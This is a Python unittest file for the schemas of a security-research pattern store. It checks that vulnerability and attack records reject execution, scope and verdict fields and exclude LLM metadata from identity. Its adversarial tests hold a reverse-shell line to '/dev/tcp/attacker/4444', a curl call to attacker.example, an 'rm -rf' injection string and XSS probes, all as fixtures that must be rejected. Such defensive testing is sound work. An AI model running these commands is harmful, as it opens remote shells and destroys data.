"""Focused tests for Research Pattern contracts (Phase 2A).

DATA-CONTRACT tests: they prove VulnerabilityPattern and AttackPattern
have no execution, scope, target-match, or verdict authority; that
grounded facts are separated from model interpretation; that identity
is deterministic and excludes LLM metadata; and that validation fails
closed. No network, no LLM, no executor is invoked.
"""

import unittest

from pydantic import ValidationError

from ai.schemas.hypothesis import LLMMetadata, ResearchProvenance
from ai.schemas.research_pattern import (
    AttackFacts,
    AttackPattern,
    AttackSurfaceCharacteristic,
    ModelInterpretation,
    ObservableCharacteristic,
    ProductIdentity,
    VersionConstraint,
    VulnerabilityFacts,
    VulnerabilityPattern,
    attack_pattern_id_from_key,
    build_attack_pattern,
    build_vulnerability_pattern,
    vulnerability_pattern_id_from_key,
)


# ------------------------------------------------------------------
# Helpers
# ------------------------------------------------------------------

_KB = "kb-" + "a" * 16
_SRC = "src-" + "b" * 16
_CLM = "clm-" + "c" * 16
_HASH = "d" * 64


def _prov(**overrides) -> ResearchProvenance:
    base = dict(
        knowledge_ids=[_KB],
        source_ids=[_SRC],
        claim_ids=[_CLM],
        research_hashes=[_HASH],
    )
    base.update(overrides)
    return ResearchProvenance(**base)


def _vp_facts() -> VulnerabilityFacts:
    return VulnerabilityFacts(
        vulnerability_ids=["CVE-2026-1234", "CWE-79"],
        products=[
            ProductIdentity(
                vendor="FooCorp",
                product="FooCMS",
                aliases=["foocms"],
            )
        ],
        version_constraints=[
            VersionConstraint(
                constraint_kind="UPPER_BOUND",
                version="4.2.1",
                upper_inclusive=True,
                raw="versions <= 4.2.1",
            )
        ],
        attack_surface=[
            AttackSurfaceCharacteristic(
                surface_kind="http_endpoint",
                path="/profile",
                method="POST",
                parameter="bio",
                parameter_location="body",
                authentication="required",
                browser_involved=True,
            )
        ],
        observables=[
            ObservableCharacteristic(
                observation_kind="javascript_executes",
                description="stored marker executes on profile render",
            )
        ],
        required_conditions=["authenticated profile editing"],
    )


def _ap_facts() -> AttackFacts:
    return AttackFacts(
        technique="stored_xss_profile_field",
        input_characteristics=["free-text profile fields"],
        sink_characteristics=["stored value rendered into html body"],
        preconditions=[
            "authenticated write path",
            "read path renders stored value",
        ],
        expected_observables=[
            ObservableCharacteristic(
                observation_kind="javascript_executes",
                description="stored marker executes on read",
            )
        ],
        technology_context=["Vue"],
    )


def _vp(**overrides):
    base = dict(
        pattern_kind="PRODUCT_VULNERABILITY",
        title="FooCMS stored XSS via profile bio",
        description=(
            "Research claims FooCMS <= 4.2.1 renders profile bio "
            "without output encoding."
        ),
        facts=_vp_facts(),
        provenance=_prov(),
        reported_severity="HIGH",
        cvss_score=8.2,
    )
    base.update(overrides)
    return build_vulnerability_pattern(**base)


def _ap(**overrides):
    base = dict(
        pattern_kind="TECHNIQUE",
        title="Stored XSS through profile field",
        description=(
            "Free-text profile fields rendered without output "
            "encoding allow stored injection."
        ),
        facts=_ap_facts(),
        provenance=_prov(),
    )
    base.update(overrides)
    return build_attack_pattern(**base)


# ==================================================================
# VulnerabilityPattern
# ==================================================================


class VulnerabilityPatternValidTests(unittest.TestCase):
    def test_valid_construction(self):  # 1
        pattern = _vp()
        self.assertEqual(pattern.status, "ACTIVE")
        self.assertEqual(
            pattern.schema_version, "vulnerability_pattern/v1"
        )
        self.assertTrue(pattern.pattern_id.startswith("vp-"))

    def test_required_fields(self):  # 2
        with self.assertRaises(ValidationError):
            _vp(title="   ")
        with self.assertRaises(ValidationError):
            _vp(description="")
        with self.assertRaises(ValidationError):
            build_vulnerability_pattern(
                pattern_kind="PRODUCT_VULNERABILITY",
                title="t",
                description="d",
                facts=VulnerabilityFacts(),
                provenance=_prov(),
            )

    def test_invalid_pattern_kind(self):  # 3
        with self.assertRaises(ValidationError):
            _vp(pattern_kind="NOT_A_KIND")
        # Wrong subset: technique-only kinds are AttackPattern values.
        with self.assertRaises(ValidationError):
            _vp(pattern_kind="TECHNIQUE")

    def test_invalid_lifecycle(self):  # 4
        pattern = _vp()
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(
                {**pattern.model_dump(mode="json"), "status": "PUBLISHED"}
            )

    def test_rejection_of_confirmed(self):  # 5
        pattern = _vp()
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(
                {**pattern.model_dump(mode="json"), "status": "CONFIRMED"}
            )

    def test_rejection_of_verified(self):  # 6
        pattern = _vp()
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(
                {**pattern.model_dump(mode="json"), "status": "VERIFIED"}
            )

    def test_rejection_of_not_vulnerable(self):  # 7
        pattern = _vp()
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(
                {
                    **pattern.model_dump(mode="json"),
                    "status": "NOT_VULNERABLE",
                }
            )

    def test_invalid_provenance(self):  # 8
        with self.assertRaises(ValidationError):
            _vp(provenance=_prov(knowledge_ids=["not-a-kb-id"]))
        with self.assertRaises(ValidationError):
            _vp(provenance=_prov(research_hashes=["short"]))

    def test_missing_provenance_or_claims(self):  # 9
        with self.assertRaises(ValidationError):
            _vp(provenance=ResearchProvenance())
        # A pattern must cite grounded claims, not just raw research.
        with self.assertRaises(ValidationError):
            _vp(provenance=_prov(claim_ids=[]))

    def test_invalid_product_identity(self):  # 10
        with self.assertRaises(ValidationError):
            ProductIdentity(product="   ")
        with self.assertRaises(ValidationError):
            ProductIdentity(product="FooCMS", cpe="not-a-cpe")
        with self.assertRaises(ValidationError):
            VulnerabilityFacts(products=[ProductIdentity(product="")])

    def test_invalid_version_constraint(self):  # 11
        with self.assertRaises(ValidationError):
            VersionConstraint(constraint_kind="EXACT")
        with self.assertRaises(ValidationError):
            VersionConstraint(
                constraint_kind="RANGE", version="1.0.0"
            )
        with self.assertRaises(ValidationError):
            VersionConstraint(
                constraint_kind="EXACT", version="1.0; rm -rf"
            )
        with self.assertRaises(ValidationError):
            VersionConstraint(
                constraint_kind="UNKNOWN", version="1.0.0"
            )

    def test_deterministic_idempotency(self):  # 12
        a = _vp()
        b = _vp()
        self.assertEqual(a.idempotency_key, b.idempotency_key)
        self.assertEqual(a.semantic_key, b.semantic_key)
        self.assertEqual(a.pattern_id, b.pattern_id)

    def test_same_semantic_basis_same_key(self):  # 13
        # Case/whitespace differences in labels must not fork identity.
        facts = _vp_facts()
        facts.required_conditions = ["  AUTHENTICATED Profile  Editing  "]
        other = build_vulnerability_pattern(
            pattern_kind="PRODUCT_VULNERABILITY",
            title="totally different title",
            description="totally different description",
            facts=facts,
            provenance=_prov(),
        )
        self.assertEqual(
            other.semantic_key,
            _vp().semantic_key,
        )
        self.assertEqual(other.pattern_id, _vp().pattern_id)

    def test_different_product_different_key(self):  # 14
        facts = _vp_facts()
        facts.products = [ProductIdentity(product="BarCMS")]
        self.assertNotEqual(
            _vp(facts=facts).idempotency_key, _vp().idempotency_key
        )

    def test_different_version_constraint_different_key(self):  # 15
        facts = _vp_facts()
        facts.version_constraints = [
            VersionConstraint(constraint_kind="UPPER_BOUND", version="4.3.0")
        ]
        self.assertNotEqual(
            _vp(facts=facts).idempotency_key, _vp().idempotency_key
        )

    def test_different_semantics_different_key(self):  # 16
        # Different required conditions (technique-shaped) diverge...
        facts = _vp_facts()
        facts.required_conditions = ["unauthenticated access"]
        self.assertNotEqual(
            _vp(facts=facts).idempotency_key, _vp().idempotency_key
        )
        # ...and different observables diverge.
        facts = _vp_facts()
        facts.observables = [
            ObservableCharacteristic(
                observation_kind="parameter_reflected",
                description="parameter reflected in body",
            )
        ]
        self.assertNotEqual(
            _vp(facts=facts).idempotency_key, _vp().idempotency_key
        )

    def test_model_metadata_does_not_alter_identity(self):  # 17
        a = _vp()
        b = _vp(
            interpretation=ModelInterpretation(
                classification_hints=["likely stored xss"],
                rationale="model reasoning text",
                confidence=0.9,
                llm=LLMMetadata(
                    provider="openrouter",
                    model="strong-model",
                    prompt_version="v3",
                    request_id="req-1",
                ),
            )
        )
        c = _vp(
            interpretation=ModelInterpretation(
                llm=LLMMetadata(provider="local", model="cheap-model"),
            )
        )
        self.assertEqual(b.idempotency_key, c.idempotency_key)
        self.assertEqual(b.pattern_id, a.pattern_id)
        # Reported severity is a research fact, not identity.
        d = _vp(reported_severity="LOW", cvss_score=3.1)
        self.assertEqual(d.idempotency_key, a.idempotency_key)

    def test_unknown_fields_rejected(self):  # 18
        pattern = _vp()
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(
                {**pattern.model_dump(mode="json"), "extra_field": "evil"}
            )
        with self.assertRaises(ValidationError):
            VulnerabilityFacts.model_validate(
                {**_vp_facts().model_dump(mode="json"), "nope": 1}
            )

    def test_executable_fields_rejected(self):  # 19
        pattern = _vp()
        for field in (
            "command", "shell", "subprocess", "eval", "exec",
            "tool_call", "callback", "plugin",
        ):
            with self.subTest(field=field):
                with self.assertRaises(ValidationError):
                    VulnerabilityPattern.model_validate(
                        {**pattern.model_dump(mode="json"), field: "evil"}
                    )

    def test_scope_authority_fields_rejected(self):  # 20
        pattern = _vp()
        for field in (
            "scope_allowed", "allow_scope", "authorized_target",
            "execution_allowed",
        ):
            with self.subTest(field=field):
                with self.assertRaises(ValidationError):
                    VulnerabilityPattern.model_validate(
                        {**pattern.model_dump(mode="json"), field: True}
                    )

    def test_finding_verdict_fields_rejected(self):  # 21
        pattern = _vp()
        for field in (
            "finding_status", "verdict", "confirmed", "evidence",
            "severity_as_verified", "verified_finding_severity",
            "target_affected", "match_score",
        ):
            with self.subTest(field=field):
                with self.assertRaises(ValidationError):
                    VulnerabilityPattern.model_validate(
                        {
                            **pattern.model_dump(mode="json"),
                            field: "CONFIRMED",
                        }
                    )

    def test_serialization_round_trip(self):  # 22
        pattern = _vp()
        restored = VulnerabilityPattern.model_validate(
            pattern.model_dump(mode="json")
        )
        self.assertEqual(restored, pattern)


class VulnerabilityPatternIntegrityTests(unittest.TestCase):
    def test_identity_tampering_fails_closed(self):
        pattern = _vp()
        # Key tampered without changing the basis → rejected.
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(
                {
                    **pattern.model_dump(mode="json"),
                    "idempotency_key": "f" * 64,
                }
            )
        # ID tampered → rejected.
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(
                {
                    **pattern.model_dump(mode="json"),
                    "pattern_id": "vp-" + "0" * 16,
                }
            )

    def test_provenance_change_changes_identity(self):
        other = _vp(provenance=_prov(claim_ids=["clm-" + "f" * 16]))
        self.assertNotEqual(other.idempotency_key, _vp().idempotency_key)
        self.assertNotEqual(other.pattern_id, _vp().pattern_id)

    def test_lifecycle_requirements(self):
        pattern = _vp()
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(
                {
                    **pattern.model_dump(mode="json"),
                    "status": "SUPERSEDED",
                }
            )
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(
                {**pattern.model_dump(mode="json"), "status": "RETIRED"}
            )
        retired = VulnerabilityPattern.model_validate(
            {
                **pattern.model_dump(mode="json"),
                "status": "RETIRED",
                "retirement_reason": "upstream project archived",
            }
        )
        self.assertEqual(retired.status, "RETIRED")


# ==================================================================
# AttackPattern
# ==================================================================


class AttackPatternValidTests(unittest.TestCase):
    def test_valid_construction(self):  # 23
        pattern = _ap()
        self.assertEqual(pattern.status, "ACTIVE")
        self.assertEqual(pattern.schema_version, "attack_pattern/v1")
        self.assertTrue(pattern.pattern_id.startswith("ap-"))

    def test_invalid_pattern_kind(self):  # 24
        with self.assertRaises(ValidationError):
            _ap(pattern_kind="NOT_A_KIND")
        # Wrong subset: vulnerability-only kinds are not attack kinds.
        with self.assertRaises(ValidationError):
            _ap(pattern_kind="PRODUCT_VULNERABILITY")

    def test_invalid_lifecycle(self):  # 25
        pattern = _ap()
        with self.assertRaises(ValidationError):
            AttackPattern.model_validate(
                {**pattern.model_dump(mode="json"), "status": "PUBLISHED"}
            )
        with self.assertRaises(ValidationError):
            AttackPattern.model_validate(
                {**pattern.model_dump(mode="json"), "status": "CONFIRMED"}
            )

    def test_invalid_provenance(self):  # 26
        with self.assertRaises(ValidationError):
            _ap(provenance=_prov(claim_ids=["bad-id"]))
        with self.assertRaises(ValidationError):
            _ap(provenance=ResearchProvenance())

    def test_deterministic_identity(self):  # 27
        a = _ap()
        b = _ap()
        self.assertEqual(a.idempotency_key, b.idempotency_key)
        self.assertEqual(a.pattern_id, b.pattern_id)
        self.assertEqual(
            a.pattern_id, attack_pattern_id_from_key(a.idempotency_key)
        )

    def test_same_semantic_basis_same_key(self):  # 28
        facts = _ap_facts()
        facts.preconditions = [
            "  Authenticated WRITE  path ",
            "Read Path Renders Stored Value",
        ]
        other = build_attack_pattern(
            pattern_kind="TECHNIQUE",
            title="different title",
            description="different description",
            facts=facts,
            provenance=_prov(),
        )
        self.assertEqual(other.idempotency_key, _ap().idempotency_key)

    def test_model_metadata_excluded_from_identity(self):  # 29
        a = _ap(
            interpretation=ModelInterpretation(
                rationale="model says so",
                llm=LLMMetadata(provider="openrouter", model="m1"),
            )
        )
        b = _ap(
            interpretation=ModelInterpretation(
                rationale="other model says otherwise",
                llm=LLMMetadata(provider="local", model="m2"),
            )
        )
        self.assertEqual(a.idempotency_key, b.idempotency_key)

    def test_unknown_fields_rejected(self):  # 30
        pattern = _ap()
        with self.assertRaises(ValidationError):
            AttackPattern.model_validate(
                {**pattern.model_dump(mode="json"), "extra": "evil"}
            )

    def test_executable_fields_rejected(self):  # 31
        pattern = _ap()
        for field in (
            "command", "shell", "subprocess", "eval", "exec",
            "tool_call", "callback", "plugin",
        ):
            with self.subTest(field=field):
                with self.assertRaises(ValidationError):
                    AttackPattern.model_validate(
                        {**pattern.model_dump(mode="json"), field: "evil"}
                    )

    def test_scope_authority_fields_rejected(self):  # 32
        pattern = _ap()
        for field in (
            "scope_allowed", "allow_scope", "authorized_target",
            "execution_allowed",
        ):
            with self.subTest(field=field):
                with self.assertRaises(ValidationError):
                    AttackPattern.model_validate(
                        {**pattern.model_dump(mode="json"), field: True}
                    )

    def test_finding_verdict_fields_rejected(self):  # 33
        pattern = _ap()
        for field in (
            "finding_status", "verdict", "confirmed", "evidence",
            "severity_as_verified", "verified_finding_severity",
            "target_affected", "match_score",
        ):
            with self.subTest(field=field):
                with self.assertRaises(ValidationError):
                    AttackPattern.model_validate(
                        {
                            **pattern.model_dump(mode="json"),
                            field: "CONFIRMED",
                        }
                    )

    def test_serialization_round_trip(self):  # 34
        pattern = _ap()
        restored = AttackPattern.model_validate(
            pattern.model_dump(mode="json")
        )
        self.assertEqual(restored, pattern)

    def test_technique_changes_identity(self):
        facts = _ap_facts()
        facts.technique = "reflected_xss_attribute_context"
        self.assertNotEqual(
            _ap(facts=facts).idempotency_key, _ap().idempotency_key
        )

    def test_requires_sink_or_observable(self):
        facts = _ap_facts()
        facts.sink_characteristics = []
        facts.expected_observables = []
        with self.assertRaises(ValidationError):
            _ap(facts=facts)


# ==================================================================
# Version constraints
# ==================================================================


class VersionConstraintTests(unittest.TestCase):
    def test_exact_version(self):  # 35
        constraint = VersionConstraint(
            constraint_kind="EXACT", version="4.2.1"
        )
        self.assertEqual(constraint.constraint_kind, "EXACT")
        self.assertIsNone(constraint.upper_version)

    def test_lower_bound(self):  # 36
        constraint = VersionConstraint(
            constraint_kind="LOWER_BOUND", version="4.0.0"
        )
        self.assertTrue(constraint.lower_inclusive)

    def test_upper_bound(self):  # 37
        constraint = VersionConstraint(
            constraint_kind="UPPER_BOUND", version="4.2.1"
        )
        self.assertFalse(constraint.upper_inclusive)

    def test_inclusive_exclusive_semantics_preserved(self):  # 38
        inclusive = VersionConstraint(
            constraint_kind="UPPER_BOUND",
            version="4.2.1",
            upper_inclusive=True,
        )
        exclusive = VersionConstraint(
            constraint_kind="UPPER_BOUND",
            version="4.2.1",
            upper_inclusive=False,
        )
        self.assertTrue(inclusive.upper_inclusive)
        self.assertFalse(exclusive.upper_inclusive)
        # Bound semantics are semantically relevant to identity.
        facts_incl = _vp_facts()
        facts_incl.version_constraints = [inclusive]
        facts_excl = _vp_facts()
        facts_excl.version_constraints = [exclusive]
        self.assertNotEqual(
            _vp(facts=facts_incl).idempotency_key,
            _vp(facts=facts_excl).idempotency_key,
        )

    def test_affected_range(self):  # 39
        constraint = VersionConstraint(
            constraint_kind="RANGE",
            version="4.0.0",
            upper_version="4.2.1",
        )
        self.assertEqual(constraint.upper_version, "4.2.1")

    def test_fixed_version(self):  # 40
        constraint = VersionConstraint(
            constraint_kind="FIXED", version="4.2.2"
        )
        self.assertEqual(constraint.version, "4.2.2")

    def test_unknown_constraint_explicit(self):  # 41
        constraint = VersionConstraint(
            constraint_kind="UNKNOWN",
            raw="affected versions are not clearly stated",
        )
        self.assertIsNone(constraint.version)
        self.assertEqual(
            constraint.raw,
            "affected versions are not clearly stated",
        )
        with self.assertRaises(ValidationError):
            VersionConstraint(constraint_kind="UNKNOWN", version="1.0")


# ==================================================================
# Fact / interpretation trust separation
# ==================================================================


class TrustSeparationTests(unittest.TestCase):
    def test_interpretation_cannot_reach_facts(self):
        pattern = _vp(
            interpretation=ModelInterpretation(
                classification_hints=["likely stored xss"],
            )
        )
        # Interpretation lives in its own subtree only.
        self.assertEqual(
            pattern.interpretation.classification_hints,
            ["likely stored xss"],
        )
        facts_dump = pattern.facts.model_dump(mode="json")
        self.assertNotIn("interpretation", facts_dump)
        self.assertNotIn("classification_hints", facts_dump)

    def test_no_verdict_scope_or_match_fields_anywhere(self):
        for model in (_vp(), _ap()):
            fields_lower = {
                key.lower() for key in type(model).model_fields
            } | {
                key.lower()
                for sub in (
                    model.facts,
                    model.interpretation,
                    model.provenance,
                )
                for key in type(sub).model_fields
            }
            for forbidden in (
                "verdict", "confirmed", "not_vulnerable",
                "finding_status", "verified_finding_severity",
                "scope_allowed", "allow_scope", "execution_allowed",
                "command", "subprocess", "shell", "tool_call",
                "eval", "callback", "plugin", "target_affected",
                "match_score", "evidence",
            ):
                self.assertNotIn(forbidden, fields_lower)

    def test_executable_payload_constructs_rejected_in_labels(self):
        with self.assertRaises(ValidationError):
            _vp(
                facts=VulnerabilityFacts.model_validate(
                    {
                        **_vp_facts().model_dump(mode="json"),
                        "required_conditions": [
                            "<script>alert(1)</script>"
                        ],
                    }
                )
            )
        with self.assertRaises(ValidationError):
            _ap(
                facts=AttackFacts.model_validate(
                    {
                        **_ap_facts().model_dump(mode="json"),
                        "sink_characteristics": ["javascript:alert(1)"],
                    }
                )
            )
        with self.assertRaises(ValidationError):
            ObservableCharacteristic(
                observation_kind="response_contains",
                description="onerror= payload present",
            )


# ==================================================================
# Adversarial / LLM-shaped objects
# ==================================================================


class AdversarialTests(unittest.TestCase):
    def test_malicious_llm_object_cannot_become_vulnerability_pattern(self):
        malicious = {
            "status": "CONFIRMED",
            "scope_allowed": True,
            "command": "curl http://attacker.example",
            "target_affected": True,
        }
        with self.assertRaises(ValidationError):
            VulnerabilityPattern.model_validate(malicious)

    def test_malicious_llm_object_cannot_become_attack_pattern(self):
        malicious = {
            "status": "VERIFIED",
            "scope_allowed": True,
            "shell": "bash -i >& /dev/tcp/attacker/4444",
            "tool_call": {"name": "exec", "args": "id"},
        }
        with self.assertRaises(ValidationError):
            AttackPattern.model_validate(malicious)

    def test_verdict_like_statuses_rejected_everywhere(self):
        for bad in ("CONFIRMED", "NOT_VULNERABLE", "VERIFIED"):
            with self.subTest(bad=bad):
                vp = _vp()
                with self.assertRaises(ValidationError):
                    VulnerabilityPattern.model_validate(
                        {**vp.model_dump(mode="json"), "status": bad}
                    )
                ap = _ap()
                with self.assertRaises(ValidationError):
                    AttackPattern.model_validate(
                        {**ap.model_dump(mode="json"), "status": bad}
                    )

    def test_execution_like_extra_fields_rejected(self):
        for field in (
            "shell", "subprocess", "eval", "exec", "tool_call",
            "callback", "finding_status", "verdict",
        ):
            with self.subTest(field=field):
                vp = _vp()
                with self.assertRaises(ValidationError):
                    VulnerabilityPattern.model_validate(
                        {**vp.model_dump(mode="json"), field: "evil"}
                    )
                ap = _ap()
                with self.assertRaises(ValidationError):
                    AttackPattern.model_validate(
                        {**ap.model_dump(mode="json"), field: "evil"}
                    )

    def test_no_network_imports_in_schema_module(self):
        import ai.schemas.research_pattern as module

        source = open(module.__file__, encoding="utf-8").read()
        for banned in (
            "import requests", "import urllib", "import httpx",
            "import socket", "import subprocess", "import os",
        ):
            self.assertNotIn(banned, source)


if __name__ == "__main__":
    unittest.main()
